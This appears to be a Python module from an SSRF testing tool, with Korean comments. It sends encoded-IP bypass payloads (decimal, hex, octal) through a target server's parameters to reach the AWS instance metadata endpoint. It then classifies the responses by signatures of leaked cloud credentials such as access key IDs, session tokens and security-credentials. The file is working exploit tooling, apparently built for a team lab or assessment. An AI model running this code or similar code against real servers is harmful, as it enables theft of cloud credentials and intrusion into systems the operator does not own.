"""
Stage 3: SSRF Bypass Diagnosis (v2)
- SSRF Candidate에 우회 기법을 순차 적용
- direct → decimal_ip → hex_ip → octal_ip

판정 로직 (3단계 우선순위):
  1) IMDS 시그니처 있음         → 확정 성공 (AWS 실환경)
  2) "차단" 시그니처 있음       → 실패 (필터에 걸림)
  3) 서버가 요청 시도한 흔적    → 우회 성공 (로컬 mock IMDS 없이도 판정 가능)

추가 기능:
- extra_params: 팀 서버의 level 같은 추가 파라미터 지원
  예: extra_params={"level": "1"} → /fetch?url=...&level=1
"""
import requests
from src.payloads import BYPASS_TECHNIQUES, build_url, DEFAULT_IMDS_IP


# 1순위: IMDS 응답 도달 시그니처 (AWS 실환경에서만 나옴)
IMDS_STRONG_SIGNATURES = [
    "accesskeyid", "sessiontoken", "instance-id", "ami-id",
    "security-credentials",
]
IMDS_WEAK_SIGNATURES = [
    "meta-data", "iam/", "hostname", "public-keys", "instance-type",
]

# 2순위: 필터에 차단됐음을 나타내는 시그니처
BLOCK_INDICATORS = [
    "차단된 호스트", "차단",             # 팀 서버
    "blocked by filter", "blocked",     # 우리 mock
    "forbidden", "not allowed", "denied", "filtered",
]

# 3순위: 필터는 뚫었으나 IMDS 미도달 (로컬 테스트에서 우회 성공 판정)
BYPASS_ONLY_INDICATORS = [
    "요청 실패", "fetch 결과",           # 팀 서버 (한글)
    "urlopen error", "connection refused",
    "timeout", "no route to host",
]


# 우회 성공으로 판정하는 verdict 집합
# - success: IMDS 실제 응답 도달 (AWS 환경)
# - bypass_only: 필터는 뚫었으나 IMDS 미도달 (로컬 테스트 환경)
BYPASS_SUCCESS_VERDICTS = ("success", "bypass_only")


def run_bypass_diagnosis(
    sink_json: dict,
    target_ip: str = DEFAULT_IMDS_IP,
    request_timeout: int = 10,
    stop_on_first_success: bool = False,
    extra_params: dict = None,
) -> list:
    """
    각 candidate 파라미터에 대해 우회 기법 순차 시도.

    Args:
        extra_params: 각 요청에 추가로 붙일 파라미터. 팀 서버의 level 같은 것.
                      예: {"level": "1"} → ?url=...&level=1
    """
    target = sink_json["target"]
    candidates = sink_json.get("ssrf_candidates", [])
    results = []
    extra_params = extra_params or {}

    for cand in candidates:
        tests = []
        successful = None

        for tech in BYPASS_TECHNIQUES:
            if successful and stop_on_first_success:
                break
            payload = build_url(tech, path="/latest/meta-data/", target_ip=target_ip)
            verdict, evidence = _try_ssrf(target, cand, payload, request_timeout, extra_params)
            is_success = verdict in BYPASS_SUCCESS_VERDICTS
            tests.append({
                "technique": tech,
                "bypassed": is_success,
                "verdict": verdict,             # "success" | "bypass_only" | "blocked" | "unknown"
                "status_code": evidence.get("status_code"),
                "body_snippet": evidence.get("body_snippet"),
            })
            if is_success and successful is None:
                successful = tech

        results.append({
            "target": target,
            "parameter": {
                "name": cand["name"],
                "method": cand["method"],
                "location": cand["location"],
            },
            "tests": tests,
            "result": "vulnerable" if successful else "safe",
            "bypass_technique": successful,
            "extra_params": extra_params,
        })

    return results


def _try_ssrf(
    target: str, param: dict, payload: str, timeout: int, extra_params: dict
) -> tuple:
    """
    Returns:
        (verdict, evidence)
        verdict: "success" | "bypass_only" | "blocked" | "unknown"
        evidence: {"status_code": int, "body_snippet": str}
    """
    method = param["method"].upper()
    location = param["location"]
    name = param["name"]
    body_params = {name: payload}
    body_params.update(extra_params)  # level 등 추가

    try:
        if location == "query":
            r = requests.get(target, params=body_params, timeout=timeout)
        elif location == "json":
            r = requests.post(target, json=body_params, timeout=timeout)
        elif location == "body":
            r = requests.post(target, data=body_params, timeout=timeout)
        else:
            return "unknown", {"status_code": None, "body_snippet": ""}

        verdict = _classify_response(r.text, r.status_code, payload)
        return verdict, {
            "status_code": r.status_code,
            "body_snippet": r.text[:200],
        }
    except requests.RequestException as e:
        return "unknown", {"status_code": None, "body_snippet": f"[req error] {e}"}


def _classify_response(body: str, status_code: int, payload: str) -> str:
    """
    응답을 4가지로 분류:
      - "success"     : IMDS 실제 응답 도달 (AWS 환경) → 확정 취약
      - "bypass_only" : 필터는 뚫었으나 IMDS 미도달 (로컬 환경) → 우회 성공 판정
      - "blocked"     : 필터에 걸림 → 우회 실패
      - "unknown"     : 판정 불가
    """
    if not body:
        return "unknown"
    lowered = body.lower()

    # payload 에코 제거 (에러 응답에 payload가 그대로 찍히는 케이스 오탐 방지)
    if payload.lower() in lowered:
        stripped = lowered.replace(payload.lower(), "")
    else:
        stripped = lowered

    # 1순위: IMDS 강한 시그니처
    if any(s in stripped for s in IMDS_STRONG_SIGNATURES):
        return "success"

    # 1.5순위: IMDS 약한 시그니처 2개 이상
    if sum(1 for s in IMDS_WEAK_SIGNATURES if s in stripped) >= 2:
        return "success"

    # 2순위: 차단 응답
    if any(b in stripped for b in BLOCK_INDICATORS):
        return "blocked"

    # 3순위: 필터 통과 흔적 (로컬 IMDS 없어도 우회 성공 판정)
    if any(x in stripped for x in BYPASS_ONLY_INDICATORS):
        return "bypass_only"

    return "unknown"


# 호환성: v1 함수명도 유지 (main.py 수정 없이 교체 가능)
def _is_imds_response(body: str, payload: str) -> bool:
    """v1 호환: 성공 여부만 boolean으로 반환."""
    verdict = _classify_response(body, 200, payload)
    return verdict in ("success", "bypass_only")


if __name__ == "__main__":
    import json, sys
    sink_json = json.load(sys.stdin)
    print(json.dumps(run_bypass_diagnosis(sink_json), indent=2, ensure_ascii=False))